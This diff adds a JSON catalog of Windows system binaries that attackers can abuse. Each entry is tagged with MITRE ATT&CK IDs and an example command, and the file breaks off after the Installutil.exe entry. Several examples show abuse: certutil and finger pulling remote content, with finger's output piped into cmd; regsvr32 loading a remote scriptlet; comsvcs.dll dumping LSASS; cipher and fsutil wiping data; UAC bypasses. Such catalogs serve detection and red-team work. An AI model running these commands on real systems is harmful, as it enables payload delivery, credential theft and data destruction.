@@ -1,0 +1,2882 @@
+{
+ "AccCheckConsole.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Verifies UI accessibility requirements",
+  "example": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x86\\AccChecker\\AccCheckConsole.exe"
+ },
+ "AddinUtil.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": ".NET Tool used for updating cache files for Microsoft Office Add-Ins.",
+  "example": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe"
+ },
+ "Advpack.dll": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Utility for installing software and drivers with rundll32.exe",
+  "example": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\advpack.dll"
+ },
+ "AgentExecutor.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Intune Management Extension included on Intune Managed Devices",
+  "example": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe"
+ },
+ "AppCert.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows App Certification Kit command-line tool.",
+  "example": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}",
+  "mitre": [
+   "T1127",
+   "T1218.007"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\App Certification Kit\\appcert.exe"
+ },
+ "AppInstaller.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Tool used for installation of AppX/MSIX applications on Windows 10",
+  "example": "start ms-appinstaller://?source={REMOTEURL:.exe}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\AppInstaller.exe"
+ },
+ "AppLauncher.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "User Experience Virtualization tool that launches applications under monitoring to capture and synchronize user settings.",
+  "example": "AppLauncher.exe {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files\\Windows Kits\\10\\Microsoft User Experience Virtualization\\Management\\AppLauncher.exe"
+ },
+ "Applaunch.exe": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "Microsoft .NET ClickOnce Launch Utility.",
+  "example": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Applaunch.exe\" /activate \"{REMOTEURL}#APPLICATION_METADATA_HERE\"",
+  "mitre": [
+   "T1127.002"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Applaunch.exe"
+ },
+ "Appvlp.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Application Virtualization Utility Included with Microsoft Office 2016",
+  "example": "AppVLP.exe {PATH_SMB:.bat}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files\\Microsoft Office\\root\\client\\appvlp.exe"
+ },
+ "Aspnet_Compiler.exe": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "ASP.NET Compilation Tool",
+  "example": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"
+ },
+ "At.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Schedule periodic tasks",
+  "example": "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",
+  "mitre": [
+   "T1053.002"
+  ],
+  "path": "C:\\WINDOWS\\System32\\At.exe"
+ },
+ "Atbroker.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Helper binary for Assistive Technology (AT)",
+  "example": "ATBroker.exe /start malware",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\Atbroker.exe"
+ },
+ "Bash.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "File used by Windows subsystem for Linux",
+  "example": "bash.exe -c \"{CMD}\"",
+  "mitre": [
+   "T1202",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\bash.exe"
+ },
+ "Bcp.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft SQL Server Bulk Copy Program utility for importing and exporting data between SQL Server instances and data files.",
+  "example": "bcp \"SELECT payload_data FROM database.dbo.payloads WHERE id=1\" queryout \"C:\\Windows\\Temp\\payload.exe\" -S localhost -T -c",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\bcp.exe"
+ },
+ "Bginfo.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Background Information Utility included with SysInternals Suite",
+  "example": "bginfo.exe {PATH:.bgi} /popup /nolicprompt",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "no default"
+ },
+ "Bitsadmin.exe": {
+  "categories": [
+   "ADS",
+   "Copy",
+   "Download",
+   "Execute"
+  ],
+  "description": "Used for managing background intelligent transfer",
+  "example": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /compl",
+  "mitre": [
+   "T1105",
+   "T1218",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\bitsadmin.exe"
+ },
+ "CL_Invocation.ps1": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Aero diagnostics script",
+  "example": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke {CMD}",
+  "mitre": [
+   "T1216"
+  ],
+  "path": "C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1"
+ },
+ "CL_LoadAssembly.ps1": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "PowerShell Diagnostic Script",
+  "example": "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\"",
+  "mitre": [
+   "T1216"
+  ],
+  "path": "C:\\Windows\\diagnostics\\system\\Audio\\CL_LoadAssembly.ps1"
+ },
+ "CL_Mutexverifiers.ps1": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Proxy execution with CL_Mutexverifiers.ps1",
+  "example": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}",
+  "mitre": [
+   "T1216"
+  ],
+  "path": "C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Mutexverifiers.ps1"
+ },
+ "Cdb.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Debugging tool included with Windows Debugging Tools.",
+  "example": "cdb.exe -cf {PATH:.wds} -o notepad.exe",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\cdb.exe"
+ },
+ "CertOC.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "Used for installing certificates",
+  "example": "certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}",
+  "mitre": [
+   "T1105",
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\certoc.exe"
+ },
+ "CertReq.exe": {
+  "categories": [
+   "Download",
+   "Upload"
+  ],
+  "description": "Used for requesting and managing certificates",
+  "example": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Windows\\System32\\certreq.exe"
+ },
+ "Certutil.exe": {
+  "categories": [
+   "ADS",
+   "Decode",
+   "Download",
+   "Encode"
+  ],
+  "description": "Windows binary used for handling certificates",
+  "example": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}",
+  "mitre": [
+   "T1027.013",
+   "T1105",
+   "T1140",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\certutil.exe"
+ },
+ "Change.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Remote Desktop Services MultiUser Change Utility",
+  "example": "change.exe user",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\change.exe"
+ },
+ "Cipher.exe": {
+  "categories": [
+   "Tamper"
+  ],
+  "description": "File Encryption Utility",
+  "example": "cipher /w:{PATH_ABSOLUTE:folder}",
+  "mitre": [
+   "T1485",
+   "T1562"
+  ],
+  "path": "c:\\windows\\system32\\cipher.exe"
+ },
+ "Cmd.exe": {
+  "categories": [
+   "ADS",
+   "Download",
+   "Upload"
+  ],
+  "description": "The command-line interpreter in Windows",
+  "example": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat",
+  "mitre": [
+   "T1048.003",
+   "T1059.003",
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\cmd.exe"
+ },
+ "Cmdkey.exe": {
+  "categories": [
+   "Credentials"
+  ],
+  "description": "creates, lists, and deletes stored user names and passwords or credentials.",
+  "example": "cmdkey /list",
+  "mitre": [
+   "T1078"
+  ],
+  "path": "C:\\Windows\\System32\\cmdkey.exe"
+ },
+ "Cmstp.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Installs or removes a Connection Manager service profile.",
+  "example": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}",
+  "mitre": [
+   "T1218.003"
+  ],
+  "path": "C:\\Windows\\System32\\cmstp.exe"
+ },
+ "Colorcpl.exe": {
+  "categories": [
+   "Copy"
+  ],
+  "description": "Binary that handles color management",
+  "example": "colorcpl {PATH}",
+  "mitre": [
+   "T1036.005"
+  ],
+  "path": "C:\\Windows\\System32\\colorcpl.exe"
+ },
+ "ComputerDefaults.exe": {
+  "categories": [
+   "UAC Bypass"
+  ],
+  "description": "ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.",
+  "example": "ComputerDefaults.exe",
+  "mitre": [
+   "T1548.002"
+  ],
+  "path": "C:\\Windows\\System32\\ComputerDefaults.exe"
+ },
+ "Comsvcs.dll": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "COM+ Services",
+  "example": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full",
+  "mitre": [
+   "T1003.001"
+  ],
+  "path": "c:\\windows\\system32\\comsvcs.dll"
+ },
+ "ConfigSecurityPolicy.exe": {
+  "categories": [
+   "Download",
+   "Upload"
+  ],
+  "description": "Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.",
+  "example": "ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}",
+  "mitre": [
+   "T1105",
+   "T1567"
+  ],
+  "path": "C:\\Program Files\\Windows Defender\\ConfigSecurityPolicy.exe"
+ },
+ "Conhost.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Console Window host",
+  "example": "conhost.exe {CMD}",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "c:\\windows\\system32\\conhost.exe"
+ },
+ "Control.exe": {
+  "categories": [
+   "ADS",
+   "Execute"
+  ],
+  "description": "Binary used to launch controlpanel items in Windows",
+  "example": "control.exe {PATH_ABSOLUTE}:evil.dll",
+  "mitre": [
+   "T1218.002"
+  ],
+  "path": "C:\\Windows\\System32\\control.exe"
+ },
+ "Createdump.exe": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)",
+  "example": "createdump.exe -n -f {PATH:.dmp} {PID}",
+  "mitre": [
+   "T1003"
+  ],
+  "path": "C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\<version>\\createdump.exe"
+ },
+ "Csc.exe": {
+  "categories": [
+   "Compile"
+  ],
+  "description": "Binary file used by .NET Framework to compile C# code",
+  "example": "csc.exe -out:{PATH:.exe} {PATH:.cs}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Csc.exe"
+ },
+ "Cscript.exe": {
+  "categories": [
+   "ADS"
+  ],
+  "description": "Binary used to execute scripts in Windows",
+  "example": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs",
+  "mitre": [
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\cscript.exe"
+ },
+ "CustomShellHost.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "A host process that is used by custom shells when using Windows in Kiosk mode.",
+  "example": "CustomShellHost.exe",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\CustomShellHost.exe"
+ },
+ "DataSvcUtil.exe": {
+  "categories": [
+   "Upload"
+  ],
+  "description": "DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.",
+  "example": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}",
+  "mitre": [
+   "T1567"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\DataSvcUtil.exe"
+ },
+ "DbgSrv.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "A process server included with Debugging Tools for Windows for remote user-mode debugging.",
+  "example": "dbgsrv.exe -t tcp:port=5005 -c {CMD}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\dbgsrv.exe"
+ },
+ "DefaultPack.EXE": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.",
+  "example": "DefaultPack.EXE /C:\"{CMD}\"",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft\\DefaultPack\\DefaultPack.exe"
+ },
+ "Desk.cpl": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Desktop Settings Control Panel",
+  "example": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "C:\\Windows\\System32\\desk.cpl"
+ },
+ "Desktopimgdownldr.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Windows binary used to configure lockscreen/desktop image",
+  "example": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "c:\\windows\\system32\\desktopimgdownldr.exe"
+ },
+ "DeviceCredentialDeployment.exe": {
+  "categories": [
+   "Conceal"
+  ],
+  "description": "Device Credential Deployment",
+  "example": "DeviceCredentialDeployment",
+  "mitre": [
+   "T1564"
+  ],
+  "path": "C:\\Windows\\System32\\DeviceCredentialDeployment.exe"
+ },
+ "Devinit.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Visual Studio 2019 tool",
+  "example": "devinit.exe run -t msi-install -i {REMOTEURL:.msi}",
+  "mitre": [
+   "T1218.007"
+  ],
+  "path": "C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\Tools\\devinit\\devinit.exe"
+ },
+ "Devtoolslauncher.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Binary will execute specified binary. Part of VS/VScode installation.",
+  "example": "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "c:\\windows\\system32\\devtoolslauncher.exe"
+ },
+ "Dfshim.dll": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "ClickOnce engine in Windows used by .NET",
+  "example": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",
+  "mitre": [
+   "T1127.002"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Dfsvc.exe"
+ },
+ "Dfsvc.exe": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "ClickOnce engine in Windows used by .NET",
+  "example": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",
+  "mitre": [
+   "T1127.002"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Dfsvc.exe"
+ },
+ "Diantz.exe": {
+  "categories": [
+   "ADS",
+   "Download",
+   "Execute"
+  ],
+  "description": "Binary that package existing files into a cabinet (.cab) file",
+  "example": "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab",
+  "mitre": [
+   "T1036",
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "c:\\windows\\system32\\diantz.exe"
+ },
+ "Diskshadow.exe": {
+  "categories": [
+   "Dump",
+   "Execute"
+  ],
+  "description": "Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).",
+  "example": "diskshadow.exe /s {PATH:.txt}",
+  "mitre": [
+   "T1003.003",
+   "T1202"
+  ],
+  "path": "C:\\Windows\\System32\\diskshadow.exe"
+ },
+ "Dnscmd.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "A command-line interface for managing DNS servers",
+  "example": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}",
+  "mitre": [
+   "T1543.003"
+  ],
+  "path": "C:\\Windows\\System32\\Dnscmd.exe"
+ },
+ "Dotnet.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "dotnet.exe comes with .NET Framework",
+  "example": "dotnet.exe {PATH:.dll}",
+  "mitre": [
+   "T1059",
+   "T1218"
+  ],
+  "path": "C:\\Program Files\\dotnet\\dotnet.exe"
+ },
+ "Dump64.exe": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "Memory dump tool that comes with Microsoft Visual Studio",
+  "example": "dump64.exe {PID} out.dmp",
+  "mitre": [
+   "T1003.001"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\Feedback\\dump64.exe"
+ },
+ "DumpMinitool.exe": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "Dump tool part Visual Studio 2022",
+  "example": "DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full",
+  "mitre": [
+   "T1003.001"
+  ],
+  "path": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\TestPlatform\\Extensions\\DumpMinitool.exe"
+ },
+ "Dxcap.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "DirectX diagnostics/debugger included with Visual Studio.",
+  "example": "Dxcap.exe -c {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Windows\\System32\\dxcap.exe"
+ },
+ "ECMangen.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Command-line tool for managing certificates in Microsoft Exchange Server.",
+  "example": "ECMangen.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\Bin\\ECMangen.exe"
+ },
+ "Esentutl.exe": {
+  "categories": [
+   "ADS",
+   "Copy",
+   "Download"
+  ],
+  "description": "Binary for working with Microsoft Joint Engine Technology (JET) database",
+  "example": "esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o",
+  "mitre": [
+   "T1003.003",
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\esentutl.exe"
+ },
+ "Eudcedit.exe": {
+  "categories": [
+   "UAC Bypass"
+  ],
+  "description": "Private Character Editor Windows Utility",
+  "example": "eudcedit",
+  "mitre": [
+   "T1548.002"
+  ],
+  "path": "c:\\windows\\system32\\eudcedit.exe"
+ },
+ "Eventvwr.exe": {
+  "categories": [
+   "UAC Bypass"
+  ],
+  "description": "Displays Windows Event Logs in a GUI window.",
+  "example": "eventvwr.exe",
+  "mitre": [
+   "T1548.002"
+  ],
+  "path": "C:\\Windows\\System32\\eventvwr.exe"
+ },
+ "Excel.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Office binary",
+  "example": "Excel.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Excel.exe"
+ },
+ "Expand.exe": {
+  "categories": [
+   "ADS",
+   "Copy",
+   "Download"
+  ],
+  "description": "Binary that expands one or more compressed files",
+  "example": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}",
+  "mitre": [
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\Expand.exe"
+ },
+ "Explorer.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Binary used for managing files and system components within Windows",
+  "example": "explorer.exe /root,\"{PATH_ABSOLUTE:.exe}\"",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Windows\\explorer.exe"
+ },
+ "Extexport.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Load a DLL located in the c:\\test folder with a specific name.",
+  "example": "Extexport.exe {PATH_ABSOLUTE:folder} foo bar",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files\\Internet Explorer\\Extexport.exe"
+ },
+ "Extrac32.exe": {
+  "categories": [
+   "ADS",
+   "Copy",
+   "Download"
+  ],
+  "description": "Extract to ADS, copy or overwrite a file with Extrac32.exe",
+  "example": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe",
+  "mitre": [
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\extrac32.exe"
+ },
+ "Findstr.exe": {
+  "categories": [
+   "ADS",
+   "Credentials",
+   "Download"
+  ],
+  "description": "Write to ADS, discover, or download files with Findstr.exe",
+  "example": "findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe",
+  "mitre": [
+   "T1105",
+   "T1552.001",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\findstr.exe"
+ },
+ "Finger.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Displays information about a user or users on a specified remote computer that is running the Finger service or daemon",
+  "example": "finger user@example.host.com | more +2 | cmd",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "c:\\windows\\system32\\finger.exe"
+ },
+ "Forfiles.exe": {
+  "categories": [
+   "ADS",
+   "Execute"
+  ],
+  "description": "Selects and executes a command on a file or set of files. This command is useful for batch processing.",
+  "example": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"",
+  "mitre": [
+   "T1202",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\forfiles.exe"
+ },
+ "Fsi.exe": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.",
+  "example": "fsi.exe {PATH:.fsscript}",
+  "mitre": [
+   "T1059"
+  ],
+  "path": "C:\\Program Files\\dotnet\\sdk\\<version>\\FSharp\\fsi.exe"
+ },
+ "FsiAnyCpu.exe": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "32/64-bit FSharp (F#) Interpreter included with Visual Studio.",
+  "example": "fsianycpu.exe {PATH:.fsscript}",
+  "mitre": [
+   "T1059"
+  ],
+  "path": "c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe"
+ },
+ "Fsutil.exe": {
+  "categories": [
+   "Execute",
+   "Tamper"
+  ],
+  "description": "File System Utility",
+  "example": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}",
+  "mitre": [
+   "T1218",
+   "T1485",
+   "T1562.001"
+  ],
+  "path": "C:\\Windows\\System32\\fsutil.exe"
+ },
+ "Ftp.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "A binary designed for connecting to FTP servers",
+  "example": "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt",
+  "mitre": [
+   "T1105",
+   "T1202"
+  ],
+  "path": "C:\\Windows\\System32\\ftp.exe"
+ },
+ "GfxDownloadWrapper.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.",
+  "example": "C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe \"URL\" \"DESTINATION FILE\"",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "c:\\windows\\system32\\driverstore\\filerepository\\64kb6472.inf_amd64_3daef03bbe98572b\\GfxDownloadWrapper.exe"
+ },
+ "Gpscript.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used by group policy to process scripts",
+  "example": "Gpscript /logon",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\gpscript.exe"
+ },
+ "Hh.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "Binary used for processing chm files in Windows",
+  "example": "HH.exe {REMOTEURL:.bat}",
+  "mitre": [
+   "T1105",
+   "T1218.001"
+  ],
+  "path": "C:\\Windows\\hh.exe"
+ },
+ "IMEWDBLD.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft IME Open Extended Dictionary Module",
+  "example": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe"
+ },
+ "Ie4uinit.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Executes commands from a specially prepared ie4uinit.inf file.",
+  "example": "ie4uinit.exe -BaseSettings",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\ie4uinit.exe"
+ },
+ "Ieadvpack.dll": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
+  "example": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\ieadvpack.dll"
+ },
+ "Ieexec.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.",
+  "example": "ieexec.exe {REMOTEURL:.exe}",
+  "mitre": [
+   "T1105",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ieexec.exe"
+ },
+ "Ieframe.dll": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Internet Browser DLL for translating HTML code.",
+  "example": "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\ieframe.dll"
+ },
+ "Ilasm.exe": {
+  "categories": [
+   "Compile"
+  ],
+  "description": "used for compile c# code into dll or exe.",
+  "example": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ilasm.exe"
+ },
+ "Infdefaultinstall.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Binary used to perform installation based on content inside inf files",
+  "example": "InfDefaultInstall.exe {PATH:.inf}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\Infdefaultinstall.exe"
+ },
+ "Installutil.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Download",
+   "Execute"
+  ],
+  "description": "The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies",
+  "example": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}",
+  "mitre": [
+   "T1105",
+   "T1218.004"
+  ],
